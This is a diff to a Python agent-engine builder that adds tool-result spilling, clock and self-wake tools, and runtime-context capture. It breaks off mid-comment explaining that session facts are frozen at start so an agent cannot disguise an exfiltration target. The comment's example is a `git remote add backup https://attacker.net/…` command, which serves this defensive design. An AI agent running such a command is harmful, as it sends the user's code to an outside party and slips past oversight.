@@ -6,12 +6,12 @@ the skill catalog (progressive disclosure) + load_skill into a TurnEngine.
 
 from __future__ import annotations
 
-from datetime import datetime
 from pathlib import Path
 from typing import Any, Callable, Optional
 
 from .agents import Agent, AgentContext, code_agent
 from .automation import scheduling_tools
+from .clock import clock_tools
 from .selfwake import selfwake_tools
 from .subscriptions import subscription_tools
 from .config import load_config
@@ -199,6 +199,8 @@ def build_engine(
     allowed_commands: Optional[list[str]] = None,
     max_iterations: Optional[int] = None,
     model_settings: Optional[dict[str, Any]] = None,
+    tool_result_max_bytes: Optional[int] = None,
+    tool_result_spill_dir: Optional[str | Path] = None,
     memory_store: Optional[MemoryStore] = None,
     # Twentieth pass: the project key memory loads/saves under. Defaults to the
     # workspace path; the manager passes the resolved key (binding > git > path)
@@ -262,9 +264,31 @@ def build_engine(
     else:
         root_list = []
 
+    # Full results and compacted transcripts must remain readable through the same
+    # scoped file tools. Register this directory before assembling those tools.
+    if tool_result_spill_dir is not None:
+        spill_dir = Path(tool_result_spill_dir).expanduser().resolve()
+    else:
+        scratch = next((r.path for r in root_list if r.label == "scratch"), None)
+        if scratch is not None:
+            spill_dir = Path(scratch) / "tool-output"
+        else:
+            import tempfile
+            import uuid
+
+            spill_dir = Path(tempfile.gettempdir()) / "aiworker" / f"tool-output-{uuid.uuid4().hex}"
+    if root_list and not any(spill_dir.is_relative_to(Path(r.path).resolve()) for r in root_list):
+        root_list.append(RootDir(path=spill_dir, writable=False, label="tool-output"))
+
     workspace_trusted = bool(ws and WorkspaceTrustStore().is_trusted(ws))
     config = load_config(ws, workspace_trusted=workspace_trusted)
-    executor = LocalExecutor(cwd=ws) if ws is not None else None
+    model_settings = dict(model_settings or {})
+    if config.max_output_tokens is not None:
+        model_settings.setdefault("max_tokens", config.max_output_tokens)
+    if config.reasoning_effort:
+        model_settings.setdefault("reasoning_effort", config.reasoning_effort)
+    # The engine bounds and spills all results. Do not discard shell output first.
+    executor = LocalExecutor(cwd=ws, max_output_chars=None) if ws is not None else None
     todo = TodoList()
     context = AgentContext(
         workspace=ws, executor=executor, todo=todo, roots=root_list or None
@@ -359,8 +383,9 @@ def build_engine(
         )
     # Self-wake: scheduling surfaces can suspend + schedule their own resumption (timer /
     # on-completion / on-event). The scheduler tick resumes due wakes.
-    if wake_store is not None and session_id and agent.scheduling:
+    if wake_store is not None and session_id and (agent.scheduling or agent.team == "lead"):
         registry.register_all(selfwake_tools(wake_store, session_id))
+    registry.register_all(clock_tools())
 
     instructions = f"{agent.system_prompt}\n\n{_NARRATION_GUIDANCE}\n\n{_FIRST_CONTACT_GUIDANCE}"
     if ws is not None:
@@ -485,12 +510,8 @@ def build_engine(
     _engine_box: list = []
 
     def context_provider() -> str:
-        # Live clock, every turn (owner ruling 2026-08-20): the environment block's
-        # "Today's date" is a session-START snapshot — stale for long-lived/self-waking
-        # sessions — and carries no time of day, which absolute scheduling
-        # (sleep_until, scheduled tasks) needs to compute wake times.
-        now = datetime.now().astimezone()
-        parts = [f"Now: {now.strftime('%Y-%m-%d %H:%M')} ({now.tzname()})"]
+        # Only user-driven changes belong here. A live clock rewrites cached history.
+        parts: list[str] = []
         if permissions.mode is Mode.PLAN:
             parts.append(_PLAN_MODE_CONTEXT)
         elif permissions.mode is Mode.DISCUSS:
@@ -533,6 +554,8 @@ def build_engine(
         model=model,
         instructions=instructions,
         approver=approver,
+        tool_result_max_bytes=(tool_result_max_bytes if tool_result_max_bytes is not None else config.tool_result_max_bytes),
+        tool_result_spill_dir=spill_dir,
         # Stop kills the in-flight foreground shell command, not just the loop.
         interrupt_hooks=[executor.interrupt_now] if executor is not None else None,
         max_iterations=(
@@ -553,6 +576,16 @@ def build_engine(
     engine.todo = todo  # type: ignore[attr-defined]
     engine.agent_name = agent.name  # type: ignore[attr-defined]
     engine.roots = root_list  # type: ignore[attr-defined]  # shared list; Slice C mutates in place
+    from .runtime_context import capture as capture_runtime, runtime_context_tool
+
+    registry.register(runtime_context_tool(engine.permissions))
+    engine.runtime_facts = capture_runtime(engine.permissions.workspace_root, engine.permissions._resolved_roots())
+    compaction_defaults = {}
+    if config.compaction_cap_tokens is not None:
+        compaction_defaults["cap_tokens"] = config.compaction_cap_tokens
+    if config.compaction_summary_max_tokens is not None:
+        compaction_defaults["summary_max_tokens"] = config.compaction_summary_max_tokens
+    engine.compaction_defaults = compaction_defaults
     # Session facts (spec Part 0 / §2.4): freeze the known world NOW, before the agent has
     # acted. Freezing is the whole point — compared against live state, an agent that runs
     # `git remote add backup https://attacker.net/…` would make its own destination look
